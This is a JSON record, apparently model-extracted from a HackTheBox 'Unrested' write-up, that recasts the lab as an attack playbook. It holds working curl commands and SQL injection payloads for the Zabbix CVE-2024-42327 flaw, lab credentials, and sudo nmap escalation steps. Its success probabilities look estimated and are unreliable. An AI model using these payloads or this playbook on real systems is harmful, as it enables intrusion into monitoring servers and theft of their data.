@@ -1,0 +1,712 @@
+{
+  "writeup_id": "Htb_Unrested",
+  "scenario_fingerprint": {
+    "scenario_name": "zabbix_sql_injection_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh",
+      "zabbix-agent",
+      "zabbix-trapper"
+    ],
+    "port_signature": "22+80+10050+10051",
+    "service_combination": "ssh+apache+zabbix-agent+zabbix-trapper",
+    "os_family": "linux",
+    "environment_type": "monitoring_infrastructure",
+    "entry_vector": "sql_injection",
+    "privilege_path": "authenticated_user_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "zabbix_7.0.0_vulnerability",
+      "december_2024_cve",
+      "authenticated_sql_injection",
+      "sudo_nmap_privilege_escalation"
+    ],
+    "environmental_clues": [
+      "zabbix_monitoring_server",
+      "ubuntu_22.04_jammy",
+      "apache_2.4.52",
+      "openssh_8.9p1",
+      "zbx_session_cookie",
+      "api_jsonrpc_endpoint"
+    ],
+    "similar_scenarios": [
+      "monitoring_server_exploitation",
+      "enterprise_monitoring_compromise"
+    ],
+    "unique_aspects": [
+      "source_code_analysis_required",
+      "custom_nmap_wrapper_bypass",
+      "zabbix_api_enumeration",
+      "blind_to_direct_sqli_conversion"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_CVE-2024-42327",
+        "success_reason": "Zabbix 7.0.0 vulnerable to authenticated SQL injection in CUser.addRelatedObjects function",
+        "prerequisite_indicators": [
+          "zabbix_version_7.0.0_identified",
+          "authenticated_api_access_available",
+          "user_get_endpoint_accessible"
+        ],
+        "recognition_patterns": [
+          "Zabbix version 7.0.0 in footer/API response",
+          "API token obtainable via user.login",
+          "user.get endpoint returns data with proper parameters"
+        ],
+        "failure_modes": [
+          "zabbix_version_patched",
+          "api_access_disabled",
+          "user_role_restrictions_applied"
+        ],
+        "environmental_factors": [
+          "default_zabbix_configuration",
+          "unpatched_installation",
+          "api_access_enabled_for_users"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Sudo_Nmap_Privilege_Escalation",
+        "success_reason": "Custom wrapper bypasses standard GTFObins nmap restrictions",
+        "prerequisite_indicators": [
+          "sudo_nmap_available",
+          "custom_wrapper_script_present",
+          "gtfobins_standard_methods_blocked"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows nmap permissions",
+          "wrapper script modifies nmap behavior",
+          "standard --interactive flag blocked"
+        ],
+        "failure_modes": [
+          "no_sudo_permissions",
+          "wrapper_properly_secured",
+          "nmap_completely_restricted"
+        ],
+        "environmental_factors": [
+          "custom_security_implementation",
+          "incomplete_privilege_restriction",
+          "wrapper_script_vulnerabilities"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "15-25 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Zabbix 7.0.0 with CVE-2024-42327",
+        "discovery_method": "Version enumeration and CVE research",
+        "why_critical": "Recent critical SQL injection vulnerability in authenticated context",
+        "how_to_recognize": [
+          "Zabbix version 7.0.0 displayed in UI/API",
+          "December 2024 vulnerability disclosure timeline",
+          "API access available with basic user role"
+        ],
+        "follow_up_actions": [
+          "test_sql_injection_in_user_get",
+          "exploit_addRelatedObjects_function",
+          "extract_database_information"
+        ]
+      },
+      {
+        "discovery": "Authenticated API access with default user role",
+        "discovery_method": "Provided credentials and API enumeration",
+        "why_critical": "Enables exploitation of SQL injection vulnerability",
+        "how_to_recognize": [
+          "user.login API returns valid token",
+          "user.get endpoint accessible",
+          "default User role permissions maintained"
+        ],
+        "follow_up_actions": [
+          "enumerate_api_endpoints",
+          "test_injection_vectors",
+          "escalate_via_sql_injection"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "authenticated_user",
+        "escalation_method": "SQL_injection_to_system_access",
+        "why_possible": "SQL injection allows database manipulation and potential code execution",
+        "recognition_signs": [
+          "sql_injection_confirmed",
+          "database_access_achieved",
+          "file_system_interaction_possible"
+        ],
+        "exploitation_path": "API SQLi → Database Access → System Shell"
+      },
+      {
+        "privilege_level": "zabbix_user",
+        "escalation_method": "Sudo_nmap_wrapper_bypass",
+        "why_possible": "Custom wrapper implementation has security flaws",
+        "recognition_signs": [
+          "sudo_nmap_permissions_available",
+          "wrapper_script_present",
+          "standard_restrictions_bypassable"
+        ],
+        "exploitation_path": "Sudo nmap → Wrapper bypass → Root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,10050,10051 open on Linux host",
+        "decision": "Identify as Zabbix monitoring server and focus on web application testing",
+        "reasoning": "Ports 10050/10051 are Zabbix-specific, port 80 shows Zabbix login",
+        "confidence": 0.98,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "zabbix_protocol_attacks",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "zabbix_login_page_found",
+          "version_7.0.0_identified",
+          "api_endpoint_accessible"
+        ],
+        "next_decision": "authenticate_with_provided_credentials"
+      },
+      {
+        "step": 2,
+        "situation": "Authenticated to Zabbix 7.0.0 with provided credentials",
+        "decision": "Research CVEs for exact version before manual enumeration",
+        "reasoning": "Specific version 7.0.0 likely has known vulnerabilities",
+        "confidence": 0.95,
+        "prerequisites": [
+          "authenticated_access",
+          "version_identified"
+        ],
+        "success_indicators": [
+          "cve_2024_42327_applicable",
+          "api_access_confirmed"
+        ],
+        "failure_fallbacks": [
+          "manual_enumeration",
+          "configuration_review",
+          "privilege_escalation_via_gui"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "CVE-2024-42327 SQL injection identified in user.get API",
+        "decision": "Exploit SQLi in selectRole parameter via CUser.addRelatedObjects",
+        "reasoning": "Authenticated user can access user.get API, vulnerability in role selection logic",
+        "confidence": 0.9,
+        "prerequisites": [
+          "api_token_obtained",
+          "user_role_permissions"
+        ],
+        "success_indicators": [
+          "sql_error_triggered",
+          "data_extraction_successful"
+        ],
+        "failure_fallbacks": [
+          "cve_2024_36467_privilege_escalation",
+          "configuration_file_access"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_zabbix_identified": {
+        "action": "authenticate_and_enumerate_version",
+        "tools": [
+          "curl",
+          "burp",
+          "browser"
+        ],
+        "next_phase": "cve_research_and_exploitation"
+      },
+      "if_sqli_succeeds": {
+        "action": "extract_database_credentials_or_hashes",
+        "purpose": "gain_system_access",
+        "tools": [
+          "custom_exploit",
+          "sqlmap_adaptation"
+        ]
+      },
+      "if_credentials_obtained": {
+        "action": "attempt_ssh_or_system_access",
+        "alternatives": [
+          "ssh_login",
+          "web_shell_upload",
+          "service_exploitation"
+        ],
+        "decision_criteria": "based_on_credential_type_and_system_access"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_exact_version_for_recent_cves",
+        "reasoning": "monitoring_software_frequently_updated_with_security_patches",
+        "applicability": "enterprise_monitoring_applications"
+      },
+      {
+        "rule": "prioritize_authenticated_api_vulnerabilities",
+        "reasoning": "higher_success_rate_than_unauthenticated_attacks",
+        "applicability": "when_application_credentials_provided"
+      },
+      {
+        "rule": "research_application_specific_ports_and_protocols",
+        "reasoning": "specialized_software_often_has_unique_attack_vectors",
+        "applicability": "enterprise_applications_with_custom_ports"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Zabbix SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "zabbix"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "zabbix_server_detected",
+          "version_7.0.0_vulnerable",
+          "api_endpoint_accessible",
+          "authenticated_session_available"
+        ],
+        "success_indicators": [
+          "sql_error_messages_returned",
+          "time_based_delays_observed",
+          "database_data_extracted"
+        ],
+        "incompatible_with": [
+          "zabbix_patched_version",
+          "api_access_blocked",
+          "waf_protection_active"
+        ],
+        "confidence_boosters": [
+          "zabbix_version_7.0.0_confirmed",
+          "api_jsonrpc_endpoint_responsive",
+          "valid_authentication_token_obtained"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Sudo Nmap Privilege Escalation",
+        "mitre_id": "T1548.003",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "sudo_nmap_permissions_available",
+          "shell_access_obtained",
+          "custom_wrapper_creation_possible"
+        ],
+        "success_indicators": [
+          "sudo_l_shows_nmap_access",
+          "custom_script_execution_successful",
+          "root_shell_obtained"
+        ],
+        "incompatible_with": [
+          "restricted_sudo_environment",
+          "nmap_not_installed",
+          "wrapper_creation_blocked"
+        ],
+        "confidence_boosters": [
+          "gtfobins_nmap_entry_exists",
+          "script_execution_permissions",
+          "path_manipulation_possible"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "zabbix_server": {
+        "port_indicators": [
+          80,
+          443,
+          10050,
+          10051
+        ],
+        "service_indicators": [
+          "http",
+          "zabbix-agent",
+          "zabbix-trapper"
+        ],
+        "banner_indicators": [
+          "Zabbix",
+          "zbx_session",
+          "api_jsonrpc.php"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_ssh": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Ubuntu",
+          "protocol 2.0"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "zabbix_sql_injection",
+          "when": "zabbix_server_detected_and_vulnerable_version",
+          "reason": "critical_vulnerability_high_success_rate"
+        },
+        {
+          "attack": "credential_testing",
+          "when": "authentication_required_and_creds_provided",
+          "reason": "necessary_for_authenticated_attacks"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "api_enumeration",
+          "when": "zabbix_api_accessible",
+          "reason": "reveals_users_and_system_information"
+        },
+        {
+          "attack": "sudo_privilege_escalation",
+          "when": "shell_access_obtained",
+          "reason": "common_misconfiguration_reliable_escalation"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection via Zabbix API",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl http://{target}/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.get\", \"params\": {\"selectRole\": [\"name from users u, role r WHERE u.roleid=r.roleid; -- -\"], \"editable\": true}, \"auth\": \"{token}\", \"id\": 1}'",
+            "actual_command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.get\", \"params\": {\"selectRole\": [\"name from users u, role r WHERE u.roleid=r.roleid; -- -\"], \"editable\": true}, \"auth\": \"b8d0a591918636dd028247ebc141cbd8\", \"id\": 1}'",
+            "output_pattern": "SQL injection successful when query structure changes",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "Zabbix API Authentication",
+            "command_template": "curl http://{target}/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.login\", \"params\": {\"username\": \"{username}\", \"password\": \"{password}\"}, \"id\": 1}'",
+            "actual_command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.login\", \"params\": {\"username\": \"matthew\", \"password\": \"96qzn0h2e1k3\"}, \"id\": 1}'",
+            "output_pattern": "{\"jsonrpc\":\"2.0\",\"result\":\"{token}\",\"id\":1}",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          }
+        ],
+        "prerequisites": [
+          "zabbix_7.0.0_vulnerable",
+          "valid_user_credentials",
+          "api_access_enabled"
+        ],
+        "success_indicators": [
+          "authentication_token_obtained",
+          "sql_error_on_single_quote",
+          "data_extraction_successful"
+        ],
+        "common_failures": [
+          "insufficient_permissions_without_editable_flag",
+          "query_syntax_errors",
+          "rate_limiting_on_api"
+        ],
+        "follow_up_techniques": [
+          "database_enumeration",
+          "credential_extraction",
+          "privilege_escalation"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "CVE-2024-42327 Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "POST /zabbix/api_jsonrpc.php with selectRole parameter injection",
+            "actual_command": "selectRole: [\"(select group_concat(username) from users) from users u, role r WHERE u.roleid=r.roleid; -- -\"]",
+            "output_pattern": "Admin,guest,matthew",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "zabbix_version_7.0.0",
+          "authenticated_user_account",
+          "api_access_permissions"
+        ],
+        "success_indicators": [
+          "user_enumeration_successful",
+          "database_content_extracted",
+          "mysql_database_confirmed"
+        ],
+        "common_failures": [
+          "missing_editable_parameter",
+          "incorrect_sql_syntax",
+          "insufficient_user_permissions"
+        ],
+        "follow_up_techniques": [
+          "password_hash_extraction",
+          "file_system_access",
+          "reverse_shell_deployment"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "Zabbix Version Enumeration",
+        "mitre_id": "T1592.002",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl http://{target}/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"apiinfo.version\", \"params\": {}, \"id\": 1}'",
+            "actual_command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"apiinfo.version\", \"params\": {}, \"id\": 1}'",
+            "output_pattern": "{\"jsonrpc\":\"2.0\",\"result\":\"7.0.0\",\"id\":1}",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          }
+        ],
+        "prerequisites": [
+          "zabbix_instance_accessible",
+          "api_endpoint_available"
+        ],
+        "success_indicators": [
+          "version_number_returned",
+          "vulnerable_version_identified"
+        ],
+        "common_failures": [
+          "api_disabled",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "cve_research",
+          "vulnerability_exploitation"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Zabbix API",
+        "use_case": "sql_injection_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "zabbix_penetration_testing"
+        ],
+        "alternatives": [
+          "direct_database_access",
+          "web_shell_upload"
+        ],
+        "best_practices": [
+          "always_check_version_first",
+          "use_editable_parameter_for_permissions",
+          "validate_sql_syntax_before_injection"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "api_interaction_and_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "api_testing",
+          "json_rpc_exploitation"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "postman",
+          "python_requests"
+        ],
+        "best_practices": [
+          "use_proper_content_type_headers",
+          "save_tokens_in_environment_variables",
+          "validate_json_syntax_before_sending"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "zabbix_cve_2024_42327_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"apiinfo.version\", \"params\": {}, \"id\": 1}'",
+            "purpose": "Identify Zabbix version",
+            "expected_output": "Version 7.0.0 confirmed"
+          },
+          {
+            "step": 2,
+            "command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.login\", \"params\": {\"username\": \"matthew\", \"password\": \"96qzn0h2e1k3\"}, \"id\": 1}'",
+            "purpose": "Authenticate and obtain API token",
+            "expected_output": "Authentication token returned"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.get\", \"params\": {\"selectRole\": [\"'\"], \"editable\": true}, \"auth\": \"TOKEN\", \"id\": 1}'",
+            "purpose": "Test for SQL injection vulnerability",
+            "expected_output": "SQL error indicating injection point"
+          },
+          {
+            "step": 4,
+            "command": "curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{\"jsonrpc\": \"2.0\", \"method\": \"user.get\", \"params\": {\"selectRole\": [\"(select group_concat(username) from users) from users u, role r WHERE u.roleid=r.roleid; -- -\"], \"editable\": true}, \"auth\": \"TOKEN\", \"id\": 1}'",
+            "purpose": "Extract user list from database",
+            "expected_output": "Admin,guest,matthew user list"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-40 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Unrested",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2024-12-05",
+      "author": "TheCyberGeek",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "sudo_abuse"
+      ],
+      "key_vulnerabilities": [
+        "zabbix_sql_injection_cve",
+        "sudo_nmap_misconfiguration"
+      ],
+      "environment_type": "monitoring_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "recent_cve_exploitation",
+        "source_code_analysis",
+        "gtfobins_bypass"
+      ],
+      "prerequisite_knowledge": [
+        "sql_injection_techniques",
+        "zabbix_architecture",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application_security",
+      "subcategories": [
+        "sql_injection",
+        "privilege_escalation",
+        "monitoring_systems"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "data_exfiltration"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "sudo_hardening",
+        "monitoring_system_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Monitored",
+        "Bagel",
+        "Shoppy"
+      ],
+      "similarity_reasons": [
+        "sql_injection_focus",
+        "source_code_analysis",
+        "recent_vulnerabilities"
+      ],
+      "unique_aspects": [
+        "zabbix_exploitation",
+        "gtfobins_bypass_technique",
+        "december_2024_cve"
+      ],
+      "difficulty_factors": [
+        "source_code_deep_dive",
+        "custom_exploit_development",
+        "sudo_wrapper_bypass"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:47:02.752598",
+    "original_file": "0xdf_writeups/Htb Unrested.md",
+    "content_length": 34225,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
